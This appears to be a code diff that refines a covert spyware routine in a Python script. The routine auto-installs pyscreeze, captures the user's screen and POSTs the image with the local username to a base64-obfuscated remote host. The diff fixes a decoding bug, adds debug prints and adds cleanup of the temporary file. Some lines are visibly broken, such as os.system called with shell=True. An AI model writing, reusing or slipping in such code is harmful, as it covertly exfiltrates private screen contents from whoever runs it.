@@ -1,6 +1,6 @@
 import os.path, subprocess, glob, time, signal, sys
 import urllib.request as r
-import urllib.error, hashlib, hmac, base64
+import urllib.error, hashlib, hmac, base64, getpass
 
 def importinstall(pipname,modulename=None,update=False,**importkwargs):
     if modulename is None:
@@ -13,20 +13,29 @@ def importinstall(pipname,modulename=None,update=False,**importkwargs):
     os.system(rf'pip install{" --upgrade" if update else ""} {pipname}', shell=True)
     return __import__(modulename)
 
-e = importinstall('pyscreeze')
+pyscreeze = importinstall('pyscreeze')
 
 def a():
-    u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').encode()
-    if hasattr(request(u, method='HEAD'),"getcode"):
+    u = base64.b64decode(b'aHR0cHM6Ly9ib29raXNoLXN5c3RlbS1qZ3Z2N3B4ajk2d2g1d2pxLTgwODAuYXBwLmdpdGh1Yi5kZXYv').decode()
+    if pre := hasattr(request(u, method='HEAD'),"getcode"):
+        print(pre)
         return
     try:
-        img = e.screenshot()
+        img = pyscreeze.screenshot()
+        print('e')
         img = img.resize((int(img.size[0]/img.size[1]*340),340))
         img.save('tmp.png')
-        with open('tmp.png', 'rb') as imgbytes:
+        print('e')
+        with open('tmp.png', 'rb') as imgbytes:\
             request(u+'receive/'+getpass.getuser(), imgbytes.read(), 'POST')
-    except:
-        pass
+    except Exception as e:
+        print(e)
+    finally:
+        try:
+            os.unlink('tmp.png')
+        except:
+            pass
+
 
 
 
